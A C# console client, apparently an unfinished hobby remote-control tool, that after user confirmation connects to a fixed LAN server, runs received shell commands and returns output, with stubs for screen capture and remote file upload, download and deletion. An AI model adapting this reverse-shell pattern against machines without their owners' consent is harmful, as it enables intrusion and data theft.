using System.IO;
using System.Net.Sockets;
using System.Text;
using TalkingHeads.Commands;

CmdController CMDController = null;
while (true)
{
    Console.Write("Type 'Y' for connect or 'N' to exit: \n>>> ");
    string? tryAgain = Console.ReadLine();
    if (tryAgain == null || tryAgain.Equals("N", StringComparison.CurrentCultureIgnoreCase))
    {
        break;
    }
    else if (tryAgain.Equals("Y", StringComparison.CurrentCultureIgnoreCase))
    {
        try
        {
            using TcpClient tcpClient = new TcpClient("192.168.178.100", 1338);
            NetworkStream stream = tcpClient.GetStream();
            CMDController = new CmdController();
            Console.WriteLine("Connected! Waiting for command...");

            byte[] buffer = new byte[1028];
            while (tcpClient.Connected)
            {
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead == 0)
                {
                    Console.WriteLine("[!] Server disconnected.");
                    break;
                }

                string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                Console.WriteLine("Received command: " + command);
                if (string.IsNullOrWhiteSpace(command))
                    continue;

                string output = await ExecuteCommand(command);
                byte[] outputBytes = Encoding.UTF8.GetBytes(output);
                stream.Write(outputBytes, 0, outputBytes.Length);
                stream.Flush();
            }
        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);
        }
        finally
        {
            CMDController?.Dispose();
        }
    }
}

async Task<string> ExecuteCommand(string command)
{
    if (string.IsNullOrWhiteSpace(command))
        return "[Empty Command]";

    string[] parts = command.Split(' ', 2);
    string prefix = parts[0].ToLower();
    string args = parts.Length > 1 ? parts[1] : "";
    try
    {
        switch (prefix)
        {
            case "cline":
                return await CMDController.Execute(args);
            case "screen":
                WindowsTools.CaptureScreen(args);
                return "[Not implemented: screenshot]";
            case "logText":
                WindowsTools.CaptureScreen(args);
                return "[Not implemented: screenshot]";
            case "search":
                //Search state wo man dateien und ordner suchen kann...
                //Datei oder ornder auswählen und optionen zum bearbeiten...
                //Löschen, Uploaden, Downloaden (Max. Größe sollte vorhanden sein)
                return "[Not implemented: file search]";
        }
    }
    catch (Exception ex)
    {
        return "[Command Error] " + ex.Message;
    }

    return $"Unknown command: {prefix}";
}
